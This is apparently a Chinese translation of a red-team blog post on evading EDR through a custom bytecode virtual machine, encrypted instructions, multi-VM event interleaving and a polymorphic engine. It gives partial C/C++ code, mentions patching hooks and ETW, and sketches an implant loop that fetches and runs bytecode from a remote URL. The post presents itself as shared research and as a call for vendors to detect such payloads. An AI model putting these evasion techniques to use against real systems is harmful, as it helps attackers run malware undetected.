介绍
==

- - - - - -

随着防御性安全产品的改进，攻击者必须不断完善他们的技术。执行恶意二进制文件的时代已经过去，尤其是那些被杀毒软件和终端检测与响应（EDR）供应商熟知的二进制文件。现在，攻击者专注于对内存中的有效载荷进行执行，以逃避防御产品的检测，无论是本地应用程序还是托管应用程序。与此同时，防御技术变得越来越复杂，这迫使攻击者进一步适应。在这种军备竞赛的时代，攻击者如何保持领先？恶意软件如何能够未雨绸缪，以逃避当前存在并正在积极开发的复杂 EDR 系统？

本博客文章回顾了一种逃避工具的演变，旨在在红队合作中协助有效载荷传递。我们将涉及该工具的历史以及在进攻和防御进展面前的未来潜力。

历史视角
====

- - - - - -

恶意软件和反恶意软件之间的军备竞赛的核心如下：反恶意软件必须在一组约束条件下将任意程序分类为良性或恶意，无论是在内存中还是静止状态下。产品受到用户或客户愿意在 CPU 时间、内存或带宽方面放弃的性能量的限制，以及产品生成的误报数量的限制。如果产品消耗资源过多，客户会抱怨速度慢。如果隔离重要文件，可能会带来更多害处。这些约束塑造并限制了反恶意软件产品演进中的每一步。编写工具时，不仅杀毒软件供应商需要担心性能。恶意软件作者在部署恶意软件时也需要考虑执行速度或其他系统变化。例如，最近发现的 XZ 后门是由一名软件工程师发现的，因为登录时间从 0.2 秒增加到 0.8 秒。 如果这段代码的作者没有明显改变系统的行为，后门很可能会成功部署。

自软盘上流传病毒的早期，编写未被检测出的恶意软件一直是攻击者和防御者之间的一场猫鼠游戏。最初，杀毒软件严格专注于基于程序指令中的签名和模式的病毒的真阳性检测。在签名数据库中没有错误的情况下，唯一的签名匹配保证了恶意样本的真阳性匹配，之后恶意文件可以被删除或隔离。这种检测方法严格遵守对抗恶意软件产品的限制，因为简单的模式匹配是高效的，真阳性检测几乎是有保证的。

对于恶意软件作者来说，解决方案很简单：为了规避检测，病毒必须通过独特模式变得不可能被检测到。这可以通过改变代码或者在运行时加密代码然后解密来实现。如果自动化这个过程，就会得到所谓的打包工具：一种工具，用于加密、压缩或以其他方式改变病毒以规避检测。打包工具会改变病毒中的大部分代码并向代码中添加一个存根。这个存根通常是程序启动时执行的第一段代码。它的作用是撤销先前对原始代码所做的所有更改（例如压缩或加密）。在所有更改被撤销后，执行将传递给原始代码。这个存根还可以利用反逆向/防篡改，试图保护原始代码免受窥探。

这减少了磁盘上或其他存储在静止状态的样本创建签名的“攻击面”数量。这种方法还用于压缩二进制文件以进行分发，从而允许更小的发布包。因此，并非所有压缩的二进制文件都可以标记为恶意。

然而，即使是非常小的解包程序存根也可能与一个可以唯一与打包程序本身相关联的签名匹配。将此签名与一些与文件中熵量相关的规则相结合，打包程序仍然可以被高度准确地检测到。在这一点上，反恶意软件解决方案已经发展到利用有关文件的元数据，如熵，获得检测打包文件的能力，但代价是更高的误报率。

恶意软件作者在军备竞赛中的下一步是消除解包器存根中的签名匹配潜力。这意味着存根必须在创建新样本时每次由不同指令组成。一个重要的见解是，“代码的功能”和“代码的外观”并非一一对应。编写计算机代码以实现特定效果或结果有无限多种方式。因此，特定解包算法可以编写无限多种方式。设计用于创建每次外观不同的解包存根的打包器可以称为多态的。执行更改的算法或代码称为多态引擎。

将打包程序与多态引擎结合起来，可以消除对静态恶意软件简单签名匹配的“攻击面”。自 2015 年以来，作者编写并维护了两个类似的多态打包程序。尽管它们仍然对现代 EDR 产生良好的效果，但即使是这些工具也越来越难以绕过防御。这是因为多态打包程序存在一个概念性缺陷：原始恶意代码在某个时刻仍然会被解密以执行。如果反恶意软件产品能够在打包程序完成解码恶意代码时计时开始扫描恶意模式，那么检测恶意软件将再次变得容易。

现代操作系统和处理器试图确保计算机内存中的所有数据都不能作为代码执行，以确保安全性。特别是，系统通常设计为防止从可写页面执行代码。因此，想要解密或解压缩自己的代码的病毒或恶意软件样本必须首先在可写内存页面中进行更改。然后，病毒将页面保护更改为可读和可执行，并将控制权转移到新修改的可执行内存。配备分析运行时其他程序行为的防恶意软件产品利用这样的行为模式来决定何时扫描进程的内存以查找恶意模式。因为一旦解密，内存就不能再更改，由于前述限制，扫描进程在使内存可执行后是发现恶意模式的理想时机。

配备规则以生成额外信号以确定程序是否恶意的反恶意软件产品被称为使用“启发式”。 从概念上讲，反恶意软件产品已经实现了一套全面的功能来检测恶意软件执行。 自这些功能完整产品的早期以来，我们看到的演变都可以理解为试图放松或解除上述约束的尝试：“基于云的保护”在他人的计算机上运行资源密集型的启发式; 添加人类监督，“EDR”中的“R”降低了误报的影响，并将人类引入检测和响应循环。

然后，红队如何能够将他们的恶意软件成功地绕过这些新的和先进的防御措施呢？在过去，病毒作者可能会使用所谓的“变形”引擎。这是一个旨在每次感染新文件时重新编写整个病毒的算法，包括整个变形引擎本身。使用它可以确保没有一个“真正”的病毒样本可以通过静态签名检测到；每个病毒副本都是完全不同的。有了这样的工具，您就不需要一个打包程序，因为没有静态模式可以唯一地与您的病毒联系起来。然而，现代软件复杂性的爆炸式增长以及恶意软件需要在多种系统上运行的要求，给这种方法带来了挑战。

逃避分析：虚拟化
========

- - - - - -

为了隐藏有效载荷的静态和动态分析，生成的样本必须能够抵抗代码检查和代码流分析。如果真实指令没有向观察者透露，几乎无法从外壳中得出任何结论。如果这一点得以实现，防御产品在检查有效载荷时将面临以下限制：

- 难以观察指令模式；
- 难以修补指令；
- 难以忽略指令；
- 难以预测行为。

隐藏指令并不是什么新鲜事。像VMProtect这样的产品通过嵌入虚拟机并生成在此虚拟机上执行的独特指令来掩盖代码的部分内容。要虚拟化的代码必须通过源代码中添加的标记或包含符号的PDB文件的存在来识别。这一要求在使用第三方工具时并不总是能够满足。此外，这种类型的保护旨在保护特定功能，例如许可证密钥检查算法，这限制了对手的使用。最后，使用现有工具可能会对检测率产生负面影响，因为这些产品经过大量研究，可能包含硬编码的节名等静态签名。

然而，考虑到虚拟化层的好处，很明显，这项技术非常强大。

创建自定义虚拟化层
=========

- - - - - -

决定创建一个虚拟化层。该层由实现操作码的虚拟机组成，以及在虚拟机上执行的字节码。将要创建的虚拟化层必须符合以下要求和限制：

1. 字节码指令按顺序执行;
2. 字节码指令在执行前后被隐藏;
3. 指令集仅支持基本的 x86-64 指令；
4. 虚拟机必须提供一个接口给系统 API；
5. 虚拟机实现必须简单且位置无关，以支持变形；
6. 虚拟化层必须在没有访问源代码或调试符号的情况下工作。

创建虚拟化层始于要执行的指令、虚拟机和支持的指令集的设计。此外，创建了最终有效负载的布局，其中所有数据必须以位置无关格式存在，并且可以像 shellcode 一样执行。这使得有效负载可以嵌入到其他可执行格式（例如可执行文件或 DLL）中，并且在分阶段恶意软件时允许动态执行。

例如，以下布局将允许上述功能。在这个例子中，虚拟机必须以一个修正存根开始，该存根正确地设置虚拟机参数寄存器为它们各自的值：

| ![](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-51d85ac4b602d790f31872038b7588655ed38f8e.png) |
|---|
| 包含位置独立代码内所有必需构建块的数据结构示例 |

一条指令的解剖
=======

- - - - - -

为了保持虚拟机架构简单，创建了一个指令格式，使指令和操作数类型之间的长度保持一致。这种设计决定允许省略长度反汇编引擎（LDE），并且可以简单地使用指令指针作为当前指令的索引。必须包含在正常的非 SSE/AVX x86 指令中的所有信息。

在其核心，指令确定必须执行的操作，以及可选地以操作数形式提供的数据。操作数可以是三种类型之一：

1. **立即数**：嵌入指令中的常数值；
2. **内存位置**：指令指向的内存位置；
3. **寄存器**：由指令识别的寄存器或其部分。

为了从操作数中获取数据，必须创建一个通用格式，该格式涵盖不同的操作数类型。决定使用单个 64 位字段来保存不同类型的操作数，因为前述类型的所有必要数据都可以嵌入到 64 位中。

下面的结构显示了每种操作数类型的布局：

`struct ImmediateOperand {    Value value;           // 常数值   }; // 大小：8字节      struct MemoryOperand {    uint8_t size;          // 操作数的有效大小（8, 16, 32, 64位）    uint8_t base;          // 存储基地址指针值的寄存器    uint8_t index;         // 存储数组索引的寄存器    uint8_t scale;         // 1, 2, 4 或 8 的常量乘数    int32_t displacement;  // 被加到计算地址上的值   }; // 大小：8字节      struct RegisterOperand {    uint8_t reg;           // x86-64寄存器集中的基础寄存器    uint8_t chunk;         // 特定的寄存器部分：低位，高位，字，双字，四字    uint16_t size;         // 操作数的有效大小（8, 16, 32, 64位）    uint32_t pad;          // 用于满足64位大小要求的填充   }; // 大小：8字节      union Operand {    ImmediateOperand imm;  // 将数据视为立即数操作数    MemoryOperand    mem;  // 将数据视为内存操作数    RegisterOperand  reg;  // 将数据视为寄存器操作数   }; // 大小：8字节`

注意：立即操作数的值类型是一个简单的联合体，包含了从(uint8\_t)到(uint64\_t)成员。这使得在实现操作码时索引正确的数据变得非常简单。

为了指示指令的“操作码”，可以使用单个 1 字节值。这提供了 256 个独特的操作码，应该足以实现基本行为。最后，每个操作数的类型必须嵌入在指令格式中，因为操作码实现必须能够查询这些类型。

`struct Instruction {       uint8_t opcode;             // 指令的操作码       uint8_t lparam_type : 4;    // 第一个（左）操作数的类型       uint8_t rparam_type : 4;    // 第二个（右）操作数的类型       Operand lparam;             // 第一个（左）操作数       Operand rparam;             // 第二个（右）操作数   }; // 大小：18 字节`

保护说明
====

- - - - - -

为了满足要求二，“`字节码指令在执行前后被隐藏`”，指令使用加密进行保护。许多加密算法可以用来隐藏指令。然而，指令的大小需要保持不变，因为指令将在原地解密和加密，不会被移动到临时缓冲区。这消除了虚拟机内部动态内存分配的必要性。此外，所选的加密方案必须易于实现，因为代码将位于虚拟机中，从而为签名检测创建一个“攻击面”。实现复杂算法会损害使用多态引擎有效操纵代码的能力。

虚拟机的解剖
======

- - - - - -

虚拟机类似于虚拟 CPU，实现了所有可用的操作码。此外，可用的寄存器、CPU 标志和堆栈都是虚拟机对象的一部分。最后，虚拟机保存了指向执行所需的字节码缓冲区的指针。实现虚拟机的一个附加好处是真实堆栈也被抽象化了。试图从堆栈中识别恶意行为的启发式方法将不会成功。

`struct Context {       uint32_t            ip;                 // 指令指针       uint8_t             flags;              // 要由操作码操作的CPU标志       Register            registers[17];      // 通用寄存器（rax, … r15 和 gs）       Instruction*        instructions;       // 指向字节码缓冲区开头的指针       uint8_t             stack[STACK_SIZE];  // 虚拟机堆栈   };`

初始化虚拟机上下文的功能，获取当前指令，并根据指令操作数加载和存储值的功能被创建，以帮助实现虚拟机内的操作码。

一旦初始化，虚拟机可以进入其调度循环。该循环包括获取当前指令并执行指令对象中的操作码字段标识的操作码。在执行之前对指令进行解密，执行后进行加密。调度函数可以实现如下：

`void dispatch_instruction(Context* vm) {       uint32_t ip = vm->ip;       decrypt_instruction(vm, ip);          switch (vm->instructions[ip].opcode) {       case Opcode::ADD: opcode_add(vm); next_instruction(vm); break;       case Opcode::AND: opcode_and(vm); next_instruction(vm); break;       case Opcode::BT:  opcode_bt(vm);  next_instruction(vm); break;       …       }          encrypt_instruction(vm, ip);   }`

一个细心的读者可能已经注意到临时变量`ip`的构造，它在进一步的操作中被使用。这源于任何修改指令指针的指令，比如`jcc`、`call`和`ret`，在操作码完成时会导致指令指针被修改。因此，指令指针不能再用于重新加密已执行的原始指令。

实施基本操作码
=======

- - - - - -

以下函数实现了位测试（`bt`）操作码:

`void opcode_bt(Context* vm) {    // get the current instruction from the context    Instruction* i = get_current_instruction(vm);       // load the value and the bit to test    Value dst = fetch_value(vm, i->lparam_type, i->lparam);    Value src = fetch_value(vm, i->rparam_type, i->rparam);       // get the size in bits of the value to check    size_t size = get_operand_size(i->lparam_type, i->lparam);       // set the carry flag to the result of the bit test    switch (size) {    case 8:  vm->flags.cf = (dst.u8 & (1 << src.u8))      != 0; break;    case 16: vm->flags.cf = (dst.u16 & (1 << src.u16))    != 0; break;    case 32: vm->flags.cf = (dst.u32 & (1 << src.u32))    != 0; break;    case 64: vm->flags.cf = (dst.u64 & (1ull << src.u64)) != 0; break;    }   }`

改进字节码处理：转译
==========

- - - - - -

最初，所有在虚拟环境中执行的字节码都是手工用汇编语言编写的。这提供了所需的控制，以确保使用特定的操作码和操作数类型，并且作为测试，实现了一个字节码中的 PE 加载程序。由于这种限制在开发时间和灵活性方面造成了重大成本，因此采用了一种新的生成字节码的方法：编译和转译 C/C++程序。这被选择为直接使用汇编器输出的原因是，解析这些文本文件被证明是繁琐且容易出错的。相反，生成的链接二进制文件被输入到反汇编器中。

使用 iced-x86 库执行二进制文件的拆解。该库允许将 x86 指令转换为自定义格式，通过检查指令的操作码、操作数类型和值，如前一节“指令解剖”所述。最终，一旦所有 x86 指令被转换，现在的转译字节码可以被虚拟机解释。

| ![](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-a6fb5cc4b10e724b37116d1a0b4bae81e52bb381.png) |
|---|
| 从源代码到最终字节码的字节码生成过程 |

转换器的实施立即使我们能够支持大量现有工具，并使编写新工具变得更容易。大多数从 C/C++编译的位置无关代码（PIC）工具，包括一些 BOFs，也可以相对容易地移植到虚拟机上执行。

字节码实现的限制
========

- - - - - -

虚拟机实现的一个限制与字节码的限制相同。为了生成在VM上执行的有效字节码，必须创建PIC。实际上，这意味着一切都是相对于当前指令指针的，并且不能存在对其他库或其他部分的引用：

- 没有静态变量；
- 没有全局变量；
- 没有字符串；
- 没有对库的静态依赖。

支持本机 API 调用
===========

- - - - - -

为了允许与操作系统层进行接口，字节码必须能够执行本机 API 调用。字节码和本机环境之间必须存在一个翻译层。编译器使用“call”指令来调用 API，需要虚拟机的“call”实现支持这种翻译。不幸的是，一旦遇到“call”指令，虚拟机对于必须转发的参数数量没有任何信息。为了解决这个问题，字节码在调用 API 时可以在前面添加参数数量，这样虚拟机层就有足够的信息来将调用转换为本机执行。为了以编程方式执行此任务，可以使用 C++ 模板中的可变参数来自动推断传递的参数数量：

`template <typename Ret, typename … Args>   struct apicall<Ret(Args…)> {    static decltype(auto) call(const void* target, Args … args) {     constexpr size_t nargs = sizeof…(Args);       // 计算传递的参数数量     using f = Ret(__stdcall*)(size_t, Args…);     // 定义要调用的API的签名     return ((f)target)(nargs, args…);             // 调用API并返回其结果    }   };      int main() {    FARPROC _Sleep = get_address_of_sleep();    apicall<decltype(Sleep)>::call(_Sleep, 10'000);    return 0;   }`

根据 Microsoft 的 x64 `__stdcall`\[15\]规范，前四个整数或指针参数使用寄存器`rcx`、`rdx`、`r8`和`r9`传递，其余参数通过堆栈传递。这意味着在执行`call`指令时，`rcx`保存必须传递给 API 的参数数量。虚拟机可以提取并检查这个值，并用它正确执行调用：

`auto target = fetch_value(vm, i->lparam_type, i->lparam);   auto nargs = vm->registers.rcx.qword;      // 提取参数   …      // 调用API   auto result = syscall(target, …);      // 将结果返回到字节码环境   vm->registers.rax = result;`

参数的实际值存储在`rdx`、`r8`、`r9`和堆栈中。从堆栈中提取参数时，必须记住保留阴影空间。

从视觉上看，这个过程是这样的：

| ![](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-1198dfde386a184ef45276505faec70d6893442e.png) |
|---|
| 一个虚拟化的`call`指令调用`ntdll!NtAllocateVirtualMemory`。这个调用被翻译为本机的`call`，并调用 API。结果值被返回给虚拟机 |

支持字节码函数回调
=========

- - - - - -

考虑将现有程序移植到字节码架构时，不能忽略代码中对函数回调的支持。例如，考虑一个简单的链表实现，其中有一个`list_search`函数接受一个谓词回调函数：

`struct Node {       int value;       node* next;   };      struct SearchContext {       int value;   };      Node* list_search(Node* head, bool(*predicate)(Node* n, const void* ctx), const void* ctx);      bool searcher(Node* n, const void* ctx) {       return n->value == ((SearchContext*)ctx)->value;   }      int main() {       Node head;              // initialize and populate list       …              SearchContext ctx = { 10 };       Node* found = list_search(&head, searcher, &ctx);          return 0;   }`

然而，一个问题出现了：虚拟机如何区分正常的字节码函数调用、本机 API 调用和函数回调？前两者之间的区别很明显：字节码函数调用是对字节码内部地址的调用，在编译时已知，而 API 调用是动态调用，意味着调用存储在寄存器或内存位置中的函数指针。鉴于字节码中的回调也是动态调用，虚拟机必须提供有关正在进行的调用类型的信息。

为了将函数指针作为参数加载，将生成一个`lea`指令，其右操作数引用一个内存地址。这个被引用的内存地址使用指令指针（`rip`）寄存器作为内存操作数的`base`字段。在转译时，可以识别这种情况。为了存储这些信息，可以向已有的三种类型（在“指令解剖”中列出）中添加一种新类型的操作数（例如`Function`）。当虚拟机执行`lea`指令时，可以检查操作数的类型。如果这个操作数的类型是`Function`，则可以向值的高 32 位添加一个标记，例如`0xDEADBEEF`。

`value = (0xDEADBEEFull << 32) | (value & 0xffffffff);`

一旦调用`call`指令，就可以查询操作数的值。如果该值包含先前添加的标记，则会请求回调。为了执行调用，从该值中剥离标记，并相应地设置指令指针。

支持用户定义的参数
=========

- - - - - -

根据正在执行的程序类型，需要用户定义的参数。例如，考虑一个简单地休眠一段时间的程序。这个程序应该休眠多久？硬编码这些值并不总是一个选择。在项目开发的早期，定义了一个简单的数据结构，可以提供给字节码的入口点：

`struct Data {       size_t      size;               // 数据大小，包括 `Data` 头部       uint8_t     key[KEY_SIZE];      // 有效载荷的解密密钥       uint8_t     payload[0];         // 有效载荷数据    };      int bytecode_main(Data* data);`

伴随着这一点，每个字节码项目都包含一个脚本，以一种可以被字节码理解的方式打包数据。然而，这些脚本之间以及提取方法之间并没有一致性。例如，提取两个 4 字节整数比提取两个字符串更简单，因为它们的大小是可变的。

为了规范这个过程，并将其纳入建筑步骤本身，而不是运行一个随机脚本，结合一个可以查询每个参数的类型和值的 API 创建了一个键值解决方案。这与 Cobalt Strike 在其 BOFs 中使用的参数打包不同，因为支持默认参数或不严格要求的参数。此外，每个参数都是单独加密的。这允许 PE 打包程序在提取 PE 数据之前提取域键信息。

以下 API 已定义：

`enum Type {       Invalid, Boolean, Integer, String, Data   };      struct Argument {       size_t      size;               // 参数的大小，包括头部       Type        type;               // 参数的类型       size_t      tag;                // 参数的标识标签       uint8_t     key[KEY_SIZE];      // 有效载荷加密密钥       uint8_t     payload[0];         // 参数数据   };      struct Arguments {       size_t      size;               // 所有参数的总大小（以字节为单位）       size_t      count;              // 参数包中存在的参数数量       uint8_t     arguments[0];       // 参数数据   };      bool has_argument(Arguments* args, size_t tag);   Argument* get_argument_by_tag(Arguments* args, size_t tag);   void decrypt_argument(Argument* arg);   void encrypt_argument(Argument* arg);      // 解释参数有效载荷的实用函数   bool get_argument_boolean(Argument* arg);   int64_t get_argument_integer(Argument* arg);   char* get_argument_string(Argument* arg);   void* get_argument_data(Argument* arg, size_t* size);`

字节码入口点的签名已更新以包含此更改：

> `int bytecode_main(Arguments* args);`

支持 DLLs
=======

- - - - - -

可执行文件和 DLL 在外观和执行方式上非常相似。两者都有一个执行传递的入口点，并且都会返回一个值。然而，可执行文件的执行流程从入口点开始，并且直到程序停止才结束。DLL 通常在其入口点内执行非常有限的初始化操作，并将执行返回给加载程序以避免锁定加载程序线程。此外，DLL 的入口点会被多次调用：在进程启动和关闭时，以及在线程创建和销毁时。调用入口点的原因由加载程序在第二个参数`dwReason`中传递。这使得`DllMain`函数内部的代码能够区分入口点被调用的原因，并做出相应的操作。

> `BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);`

为了允许我们的 shellcode 嵌入到 DLL 中，虚拟机和其字节码都必须意识到调用的原因。这需要虚拟机和字节码的入口点与 DLL 的匹配，通过操作系统加载程序自动接收原因。这不会干扰正常可执行文件使用的入口点，因为任何可执行文件的默认入口点不会直接接受任何参数，而是由 C 运行时解析参数 `argc` 和 `argv`，而 C 运行时不会链接。

在初始化时，虚拟机将字节码的`rdx`寄存器设置为其原因参数的值，并将该值作为第二个参数传递给入口点。程序员必须决定是否在字节码中检查此值，并且在编写嵌入在可执行文件中的字节码时不应使用该值。

欺骗行为分析：多虚拟机执行
=============

- - - - - -

早些时候，基于行为的检测方法已经讨论过。这种动态形式的检查应用程序的执行流程，无论静态模式如何，都很难让攻击者摆脱其恶意软件。打开 `Lsass.exe` 并读取其内存可能被标记为恶意，即使该进程看起来像 `calc.exe`。通常，防御产品通过内核回调接收事件，例如 `PsSetCreateProcessNotifyRoutine` 或 `PsSetLoadImageNotifyRoutine`，本地进程中的 API/syscall 钩子，或者使用 Windows 事件跟踪（ETW）消费者。

在本地进程中修补钩子以及提供事件的本地 ETW 功能是微不足道的。这样可以消除杀毒软件或 EDR 解决方案对进程的侵入式监控，并阻止进程创建事件。然而，一些事件仍然会生成，主要是由内核中存在的 ETW 提供程序以及内核回调生成的。此外，在修补过程中创建的事件仍然可能被监视。最后，使防御产品失效可能会产生负面影响，因为未能接收到检查可能被视为错误，本身可能被视为恶意行为的信号。

作为攻击者，生成任意事件以及可能引起检测的事件可能是一种阻挠基于行为的动态检测规则的方法。在常规指令之间添加生成事件的代码将需要操纵源代码，这并不理想。创建一个生成随机事件的新线程可能是徒劳的，因为事件是按照进程中的唯一线程注册的。

虚拟机已扩展以支持`vmcalls`。字节码发出的这些类型的`call`指令通知虚拟机层需要执行任务。在多种不同支持的调用中，最值得注意的有以下几种：

`vminit`: 使用字节码和参数初始化虚拟机对象 `vmexec`: 在虚拟机上执行 N 个周期

这两个调用的组合允许字节码创建一个新的虚拟机，并执行预定数量的指令：

`#define NUM_CYCLES 200      // 加载恶意字节码并创建虚拟机对象   auto malicious = load_malicious_instructions();   auto malicious_vm = allocate_vm_object();      // 加载创建事件的字节码   auto events = load_event_bytecode();   auto events_vm = allocate_vm_object();      // 使用它们的字节码初始化虚拟机对象，且不带任何参数   vmcall<vminit>::call(malicious_vm, malicious, nullptr);   vmcall<vminit>::call(events_vm, events, nullptr);      while (true) {       vmcall<vmexec>::call(malicious_vm, NUM_CYCLES);       vmcall<vmexec>::call(events_vm, NUM_CYCLES);   }`

因为两组字节码都在同一个虚拟机内执行，因此在同一个线程上执行，无法区分每个事件的来源。操作系统和任何事件消费者将观察到一个单一线程生成多个事件，其中既有良性事件，也可能有恶意事件。对于攻击者来说，最重要的是这可能会破坏被监视的行为模式。

作为这些额外指令的另一个好处，现在可以在运行时获取和执行字节码。在负载开发过程中，这被证明是一个非常有用的功能，因为在命令和控制期间不需要分阶段地放置 shellcode，而可以提供字节码。这消除了为执行 shellcode 分配可执行内存区域（或在后期更改内存保护）的必要性，从而消除了防御产品检查用于动态代码执行的缓冲区的机会，这些缓冲区经常被攻击者利用。

例如，可以实现以下行为来创建一个简单的轮询植入物，每 10 秒请求一次字节码：

`// 分配虚拟机对象   auto vm = allocate_vm_object();      while (true) {       // 尝试从服务器获取字节码       void* bytecode = http_get("https://example.com/bytecode");          // 检查是否接收到字节码       if (bytecode) {           // 使用我们的字节码初始化虚拟机对象，并完全执行它           vmcall<vminit>::call(vm, bytecode, nullptr);           vmcall<vmexec>::call(vm, RUN_UNTIL_END);       }          // 释放字节码缓冲区并休眠10秒       free(bytecode);       sleep(10'000);   }`

保护虚拟机
=====

- - - - - -

在这一点上，我们已经击败了我们所知道的大多数检测措施，并着手击败。然而，虚拟机与原始打包程序共享一个根本性的弱点：本地代码虚拟机中的静态模式。在其开发过程中，虚拟机被保持尽可能简单，遵循了旨在支持在虚拟机的二进制代码上执行多态引擎的约束条件。这使得开发工作变得更加繁琐，但是，鉴于有一个足够强大的多态引擎，确实可以完全关闭检测循环。我们开发的多态引擎经过多年与现代 EDR 和反恶意软件的使用进行了战斗测试。尽管引擎的代码是多年前设计的，并且自那时以来基本没有改变，但它仍然成功地使恶意代码变异到在运行时和扫描时变得无法检测的程度。

由于宇宙的运作方式，引擎无法支持任意程序。最大的限制是不支持动态控制流。这意味着间接函数调用、间接跳转和`ret`指令都有可能破坏变异代码。我们的引擎假设您知道自己在做什么，并且在遇到这些指令时不会抱怨，但生成的代码可能不会按预期工作。

多态引擎支持多种不同的变异技术，包括：

- 指令替换：用语义等效的指令替换指令。例如：`mov eax, 0` 可以替换为 `xor eax, eax`;
- 基本块重排序：更改代码中基本块的顺序；
- 基本块创建：通过跳转和推送返回将新的基本块插入到代码中；
- NOP 指令插入：插入 NOP 指令以更改代码的布局。

最重要的特点是引擎的输出可以再次输入到引擎中。这允许进行多次变异迭代，从而导致几乎无法理解的拆解。当输入是一小段代码时，比如 shellcode 加载器时，这尤其有用。足够数量的变异将使输出的大小翻倍，甚至是四倍，进一步混淆了防御者的视线。

结论
==

- - - - - -

由于安全形势不断变化，攻击者和防御者都必须保持警惕。防御安全产品随着时间的推移不断改进，使得攻击者更难保持不被发现，甚至无法执行恶意代码。有效载荷的检测已经从静态分析转变为启发式和签名的结合，使一些工具变得过时。

在这篇博客文章中，我们描述了一种工具，该工具通过虚拟化的方式来处理静态和动态分析。这种技术，以及使用自定义多态引擎试图通过层层混淆来规避这些类型的分析。为了绕过启发式分析，添加了支持同时运行多个虚拟机的功能，破坏了创建事件中的模式。作为额外的奖励，没有先前知识的情况下对样本进行逆向工程可能是一项艰巨的任务。分析人员不仅需要对变形的虚拟机本身进行逆向工程，还需要提取变形的字节码进行进一步分析。这并不能解决攻击者对逆向工程有效载荷的问题，但可以显著减慢该过程，为攻击者提供更多时间。

在实践中，该项目使得在一些受到严密监控的环境中，在红队和 TIBER 演习期间攻击保持未被检测，利用了最先进的 EDR 解决方案。此外，由于添加了一个将编译二进制文件转换为自定义字节码的转译器，定制有效载荷的开发速度和便捷性得到了极大的提升。

以下是最近一次红队行动期间创建的一些有效规避检测的有效载荷列表：

- 多个持久性模块；
- 多个横向移动模块；
- Shellcode和字节码执行器；
- 防病毒和EDR补丁程序；
- HTTP(s)和DNS信标；
- 查询Active Directory信息的工具。

其他工具的移植正在进行中，我们预计在未来不久将拥有大多数用于红队演练工具的虚拟化版本。

展望未来
====

- - - - - -

这篇博客文章的动机有两个方面。首先，我们想与社区分享我们认为令人兴奋的研究。我们从公开分享的博客文章和文章中学到了很多，希望回馈社区。我们利用所学知识来通过攻击性安全测试提高客户的安全性，希望这篇博客文章能帮助并激励其他人做同样的事情。

其次，尽管安全产品已经取得了巨大进步，但我们想要表明仍有改进的空间。我们注意到在安全行业的某些领域存在一种“**安装 EDR 后就完事了**”的倾向。尽管这在一段时间内可能有效，因为现代 EDR 确实增加了强大的安全层，但攻击者仍然有可能绕过这些产品。随着形势的发展和普遍的网络安全知识的增加，网络犯罪分子的技能和复杂性将会提高。请将这篇博客文章以及其中解释的技术视为一种警告和行动号召。我们希望安全供应商考虑如何检测这些类型的载荷，以及如何改进他们的产品以保持领先地位，就像他们现在所做的那样。

参考资料
----

1. <https://www.openwall.com/lists/oss-security/2024/03/29/4> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#7585f960-0f16-4135-a8ca-4c1a7afaf522-link)
2. [https://en.wikipedia.org/wiki/Polymorphic\_engine](https://en.wikipedia.org/wiki/Polymorphic_engine) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#44855f57-fd3e-421c-982e-d36328596170-link)
3. [https://en.wikipedia.org/wiki/Executable-space\_protection](https://en.wikipedia.org/wiki/Executable-space_protection) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c-link)
4. [https://en.wikipedia.org/wiki/Metamorphic\_code](https://en.wikipedia.org/wiki/Metamorphic_code) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#cfd6c36c-6510-4789-b2d1-c0e4563fe349-link)
5. <https://vmpsoft.com/> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#acb3be7f-0d0e-469f-9341-965d785683ff-link)
6. <https://en.wikipedia.org/wiki/Opcode> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#2ebbe913-5b00-48a1-b7b0-e23287e60c0b-link)
7. <https://en.wikipedia.org/wiki/Bytecode> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c7153637-5f3e-4f28-bf6c-424c707b29e3-link)
8. [https://en.wikipedia.org/wiki/Disassembler#Length\_disassembler](https://en.wikipedia.org/wiki/Disassembler#Length_disassembler) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#1960560c-70db-407a-a395-9e1603895b60-link)
9. [https://en.wikipedia.org/wiki/Streaming\_SIMD\_Extensions](https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#389cbcc6-797d-4476-9eba-0e3e964d20ff-link)
10. [https://en.wikipedia.org/wiki/Advanced\_Vector\_Extensions](https://en.wikipedia.org/wiki/Advanced_Vector_Extensions) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#745fab9c-8318-41e7-8c04-e5e6ed908584-link)
11. <https://www.felixcloutier.com/x86/bt> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#3e7aeb95-4e7c-44d8-8927-61a261e8050f-link)
12. <https://github.com/icedland/iced> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#ad0bb794-316c-4597-88f6-ecbc4030e79c-link)
